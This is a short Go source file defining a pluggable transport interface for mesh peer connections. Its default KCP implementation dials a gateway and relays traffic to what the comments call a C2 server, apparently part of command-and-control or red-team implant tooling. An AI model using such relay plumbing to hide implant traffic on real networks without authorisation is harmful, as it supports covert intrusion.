package mesh

// transport.go — pluggable transport interface for mesh peer connections.
//
// MeshTransport abstracts the dial mechanism for connecting to a Gateway.
// The default implementation is KCPTransport which uses bridge.go's DialGateway
// (KCP + CONNECT_C2 opcode → transparent pipe to C2 TLS).
// Future implementations could wrap QUIC, TCP, etc.

import (
	"context"
	"net"
)

// MeshTransport is the interface for dialling a mesh Gateway peer.
// Dial should return a net.Conn representing a transparent pipe to the C2 server.
type MeshTransport interface {
	Dial(ctx context.Context, peerIP, kcpPort string) (net.Conn, error)
}

// KCPTransport is the default MeshTransport.
// It calls DialGateway (bridge.go): connects via KCP, sends CONNECT_C2 opcode,
// and returns a net.Conn transparently piped to C2 TLS.
type KCPTransport struct{}

func (KCPTransport) Dial(ctx context.Context, peerIP, kcpPort string) (net.Conn, error) {
	return DialGateway(ctx, peerIP)
}
